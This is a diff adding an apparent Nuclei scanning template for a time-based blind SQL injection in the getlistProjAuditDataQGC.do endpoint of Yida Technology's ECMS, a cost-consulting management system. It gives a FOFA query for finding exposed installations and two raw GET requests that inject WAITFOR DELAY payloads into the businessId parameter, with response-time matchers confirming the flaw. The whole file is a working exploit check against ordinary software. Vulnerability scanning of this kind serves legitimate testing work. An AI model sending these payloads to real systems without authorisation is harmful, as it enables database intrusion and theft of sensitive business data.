@@ -1,0 +1,25 @@
+id: yida-ecms-getlistprojauditdataqgc-sqli
+info:
+  name: "易达科技ECMS getlistProjAuditDataQGC接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="易达科技-ECMS"
+          易达科技ECMS（工程造价咨询企业管理系统）作为工程造价咨询行业的数字化管理平台，其getlistProjAuditDataQGC接口存在SQL注入安全缺陷。攻击者可通过构造恶意SQL命令执行任意数据库操作，导致敏感数据泄露或数据完整性受损。
+  tags: 易达科技
+http:
+- raw:
+  - |
+    GET /procedure/getlistProjAuditDataQGC.do?projAudit.isOut=1&businessId=1%27WAITFOR%20DELAY%20%270:0:5%27--&uesrId=1&costWorkId=1&flowId=1 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+  - |
+    GET /procedure/getlistProjAuditDataQGC.do?projAudit.isOut=1&businessId=1%27WAITFOR%20DELAY%20%270:0:8%27--&uesrId=1&costWorkId=1&flowId=1 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
